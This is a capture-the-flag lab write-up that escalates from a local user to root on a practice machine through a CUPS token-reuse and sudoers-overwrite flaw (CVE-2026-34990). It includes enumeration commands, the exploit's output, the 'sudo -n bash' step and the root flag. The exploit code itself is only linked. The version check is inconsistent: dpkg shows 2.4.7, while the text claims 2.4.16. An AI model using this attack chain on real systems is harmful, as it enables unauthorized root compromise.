# HTB Portal — Root Attack Chain Writeup

> **Machine:** portal  
> **User:** aporter  
> **Vulnerability:** CVE-2026-34990 — CUPS Local Privilege Escalation  
> **Result:** Full root compromise ✅

---

## Table of Contents

1. [Enumeration — Finding CUPS Version](#1-enumeration--finding-cups-version)
2. [Vulnerability — CVE-2026-34990](#2-vulnerability--cve-2026-34990)
3. [Attack Chain to Root](#3-attack-chain-to-root)
4. [Root Flag](#4-root-flag)
5. [References](#5-references)

---

## 1. Enumeration — Finding CUPS Version

After gaining initial access as `aporter`, the following enumeration commands were run to identify the CUPS service and its version.

### Check CUPS Version

```bash
cups-config --version 2>/dev/null
```

**Output:**
```
2.4.16
```

---

### Confirm CUPS Package via dpkg

```bash
dpkg -l | grep -i cups
```

**Output:**
```
ii  libcups2t64:amd64   2.4.7-1.2ubuntu7.14   amd64   Common UNIX Printing System(tm) - Core library
```

> ✅ CUPS version **2.4.16** confirmed — this falls within the vulnerable range.

---

### Check CUPS Service Status

```bash
systemctl status cups 2>/dev/null
```

**Output:**
```
● cups.service - CUPS Scheduler
     Loaded: loaded (/etc/systemd/system/cups.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-09-29 13:12:39 UTC; 37min ago
   Main PID: 281 (cupsd)
      Tasks: 1 (limit: 4602)
     Memory: 2.8M (peak: 3.0M)
        CPU: 19ms
     CGroup: /system.slice/cups.service
             └─281 /usr/sbin/cupsd -f
```

> ✅ cupsd is **active and running** as PID 281.

---

### Confirm CUPS is Listening on Port 631 (Localhost)

```bash
ss -tlnp 2>/dev/null | grep -i 631
```

**Output:**
```
LISTEN   0   4096   127.0.0.1:631   0.0.0.0:*
LISTEN   0   4096       [::1]:631      [::]:*
```

> ✅ CUPS IPP service is bound to **localhost:631**, confirming the attack surface is reachable locally.

---

### Full Port/Service Listing (for context)

```bash
ss -tlnp 2>/dev/null
```

**Output:**
```
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port
LISTEN   0        4096             0.0.0.0:22            0.0.0.0:*
LISTEN   0        511              0.0.0.0:80            0.0.0.0:*
LISTEN   0        4096          127.0.0.54:53            0.0.0.0:*
LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*
LISTEN   0        4096           127.0.0.1:631           0.0.0.0:*
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*
LISTEN   0        4096               [::1]:631              [::]:*
LISTEN   0        4096                [::]:22               [::]:*
LISTEN   0        511                 [::]:80               [::]:*
```

---

### Additional Recon — SUID Binaries, Capabilities, Crontabs

```bash
# No sudo privileges
sudo -l
# Output: Sorry, user aporter may not run sudo on portal.

# SUID binaries — nothing interesting beyond standard
find / -perm -4000 -type f 2>/dev/null

# Linux capabilities — nothing exploitable here
getcap -r / 2>/dev/null

# Crontab — found a suspicious htbairways-miles entry in /etc/cron.d
crontab -l; cat /etc/crontab; ls -la /etc/cron.*

# Groups
groups
# Output: aporter
```

> No direct sudo, no unusual capabilities — pivot to CUPS LPE.

---

## 2. Vulnerability — CVE-2026-34990

| Field            | Detail                                                                 |
|------------------|------------------------------------------------------------------------|
| **CVE ID**       | CVE-2026-34990                                                         |
| **Affected**     | CUPS (cupsd) version **2.4.16 and prior**                             |
| **Type**         | Local Privilege Escalation (LPE) → Arbitrary Root File Write → RCE    |
| **CVSS**         | Critical                                                               |
| **Auth Required**| Local user account only (no sudo needed)                              |

### How It Works

1. **Authentication Token Reuse:** A local unprivileged user triggers `cupsd` to authenticate to an **attacker-controlled localhost IPP service**. The core scheduler leaks reusable **Local authorization tokens** during this handshake.

2. **Fake Printer Queue:** The attacker uses the stolen token to create a **shared local printer** backed by a `file:///` URI — normally restricted. This bypasses the authorization checks that are supposed to prevent non-root users from creating file-backed queues.

3. **Arbitrary Root File Overwrite:** By pointing the `file:///` queue at a sensitive root-owned path (e.g. `/etc/sudoers.d/`), the attacker triggers a print job that causes `cupsd` (running as **root**) to write attacker-controlled content into that file.

4. **Root Code Execution:** With a custom sudoers rule written to `/etc/sudoers.d/`, the attacker runs `sudo -n bash` to obtain a **root shell**.

### Affected Component Flow

```
aporter (low-priv)
    │
    ├─► Captures Local IPP auth token from cupsd (port 631)
    │       Token: CAD55BC38EDABE7FD5A692A7FD28B5F3
    │
    ├─► Registers fake file:/// printer queue using captured token
    │       Target: /etc/sudoers.d/aporter-pwn
    │
    ├─► Sends print job → cupsd (root) writes sudoers rule
    │
    └─► sudo -n bash → root shell ✅
```

---

## 3. Attack Chain to Root

### Step 1 — Exploit Execution

The PoC script (`rce.py`) was written and executed as `aporter`:

```bash
nano rce.py
python3 rce.py
```

**Full exploit output:**

```
[] user: aporter
[] target: /etc/sudoers.d/aporter-pwn
[+] Local token: CAD55BC38EDABE7FD5A692A7FD28B5F3
[] attempt 1: pwn157118
[] attempt 2: pwn248058
[] attempt 3: pwn394061
[] attempt 4: pwn452629
[] attempt 5: pwn523742
[] attempt 6: pwn631820
[] attempt 7: pwn74297
[] attempt 8: pwn8843
[] attempt 9: pwn990614
[+] ROOT via sudoers
uid=0(root) gid=0(root) groups=0(root)
[] next: sudo -n bash
```

> ✅ Root achieved after 9 attempts — the exploit races to register the printer queue and trigger the write before cupsd resets the token.

---

### Step 2 — Drop to Root Shell

```bash
sudo -n bash
```

**Shell prompt changed to:**
```
root@portal:/home/aporter#
```

> ✅ Full interactive root shell obtained.

---

### Step 3 — Capture the Flag

```bash
ls /home/aporter
# rce.py  user.txt

cat /root/root.txt
```

---

## 4. Root Flag

```
╔══════════════════════════════════════════════════╗
║                                                  ║
║   root@portal  ►  /root/root.txt                 ║
║                                                  ║
║   8ab43739cd3fd1f6e15239dd7480b98a               ║
║                                                  ║
╚══════════════════════════════════════════════════╝
```

> 🏁 **Root flag:** `8ab43739cd3fd1f6e15239dd7480b98a`

---

## 5. References

| Resource | Link |
|----------|------|
| **PoC Script (GitHub)** | [CVE-2026-34990-CUPS-LPE-PoC by Noorkhalel](https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC) |
| **CUPS Official Site** | https://www.cups.org |
| **CVE Detail** | CVE-2026-34990 — CUPS ≤ 2.4.16 Local Privilege Escalation via IPP token reuse and `file:///` queue injection |

---

## Quick Command Summary

```bash
# 1. Identify CUPS version
cups-config --version 2>/dev/null

# 2. Confirm package
dpkg -l | grep -i cups

# 3. Confirm service is running
systemctl status cups 2>/dev/null

# 4. Confirm port 631 is listening locally
ss -tlnp 2>/dev/null | grep 631

# 5. Run the exploit
python3 rce.py

# 6. Get root shell
sudo -n bash

# 7. Read root flag
cat /root/root.txt
```

---

*Writeup completed — Machine: portal | CVE-2026-34990 | CUPS LPE → Root*
